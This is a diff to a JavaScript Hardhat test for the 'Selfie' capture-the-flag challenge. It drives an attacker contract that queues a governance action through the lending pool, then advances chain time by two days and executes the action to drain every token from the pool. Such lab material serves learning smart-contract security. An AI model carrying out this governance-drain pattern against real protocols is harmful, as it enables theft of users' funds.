@@ -1,4 +1,5 @@
 const { ethers, network } = require("hardhat");
+
 const { expect } = require("chai");
 
 describe("[Challenge] Selfie", function () {
@@ -38,7 +39,7 @@ describe("[Challenge] Selfie", function () {
       this.governance.address
     );
 
-    this.SelfiePoolAttacker = await AttackerFactory.deploy();
+    this.attacker = await AttackerFactory.deploy();
 
     await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -48,26 +49,25 @@ describe("[Challenge] Selfie", function () {
   });
 
   it("Exploit", async function () {
-    await this.SelfiePoolAttacker.exploit(
+    await this.attacker.exploit(
       this.pool.address,
       this.governance.address,
       this.token.address,
-      attacker.address
+      this.attacker.address
     );
 
     await network.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
     await network.provider.send("evm_mine");
+    // await time.increase(time.duration.days(2));
 
-    await this.governance.executeAction(
-      await this.SelfiePoolAttacker._actionId()
-    );
+    await this.governance.executeAction(await this.attacker._actionId());
   });
 
   after(async function () {
     /** SUCCESS CONDITIONS */
 
     // Attacker has taken all tokens from the pool
-    expect(await this.token.balanceOf(attacker.address)).to.be.equal(
+    expect(await this.token.balanceOf(this.attacker.address)).to.be.equal(
       TOKENS_IN_POOL
     );
     expect(await this.token.balanceOf(this.pool.address)).to.be.equal("0");
